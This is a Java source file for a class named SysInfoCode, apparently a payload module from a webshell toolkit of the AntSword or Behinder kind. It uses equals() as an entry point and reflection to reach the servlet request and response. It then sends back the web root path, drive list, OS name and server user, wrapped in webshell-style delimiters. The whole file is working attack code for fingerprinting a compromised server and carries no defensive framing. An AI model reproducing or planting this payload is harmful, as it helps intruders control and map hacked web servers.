
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.jsp.PageContext;
import java.io.File;
import java.lang.reflect.Field;

public class SysInfoCode {
    public HttpServletRequest request=null;
    public HttpServletResponse response=null;
    @Override
    public boolean equals(Object obj) {
        if (obj instanceof PageContext){
            PageContext page = (PageContext)obj;
            request = (HttpServletRequest) page.getRequest();
            response = (HttpServletResponse) page.getResponse();
        }
        else if(obj instanceof HttpServletRequest){
            request=(HttpServletRequest)obj;
            try {
                Field req = request.getClass().getDeclaredField("request");
                req.setAccessible(true);
                HttpServletRequest request2= (HttpServletRequest) req.get(request);
                Field resp=request2.getClass().getDeclaredField("response");
                resp.setAccessible(true);
                response= (HttpServletResponse) resp.get(request2);
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
        else if (obj instanceof HttpServletResponse){
            response= (HttpServletResponse) obj;
            try {
                Field resp=response.getClass().getDeclaredField("response");
                resp.setAccessible(true);
                HttpServletResponse response2= (HttpServletResponse) resp.get(response);
                Field req=response2.getClass().getDeclaredField("request");
                req.setAccessible(true);
                request= (HttpServletRequest) req.get(response2);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        String cs=request.getParameter("charset")!=null?request.getParameter("charset"):"UTF-8";
        StringBuffer output = new StringBuffer("");
        StringBuffer sb = new StringBuffer("");
        try {
            response.setContentType("text/html");
            request.setCharacterEncoding(cs);
            response.setCharacterEncoding(cs);
            output.append("->" + "|");
            sb.append(SysInfoCode(request));
            output.append(sb.toString());
            output.append("|" + "<-");
            response.getWriter().print(output.toString());
        } catch (Exception e) {
            sb.append("ERROR" + ":// " + e.toString());
        }
        return true;
    }

    String SysInfoCode(HttpServletRequest r) {
        String d = "";
        try {
            if(r.getSession().getServletContext().getRealPath("/") != null){
                d = r.getSession().getServletContext().getRealPath("/");
            }else{
                String cd = this.getClass().getResource("/").getPath();
                d = new File(cd).getParent();
            }
        } catch (Exception e) {
            String cd = this.getClass().getResource("/").getPath();
            d = new File(cd).getParent();
        }
        d = String.valueOf(d.charAt(0)).toUpperCase() + d.substring(1);
        String serverInfo = System.getProperty("os.name");
        String user = System.getProperty("user.name");
        String driverlist = this.WwwRootPathCode(d);
        return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
    }
    String WwwRootPathCode(String d) {
        String s = "";
        if (!d.substring(0, 1).equals("/")) {
            File[] roots = File.listRoots();
            for (int i = 0; i < roots.length; i++) {
                s += roots[i].toString().substring(0, 2) + "";
            }
        } else {
            s += "/";
        }
        return s;
    }
}
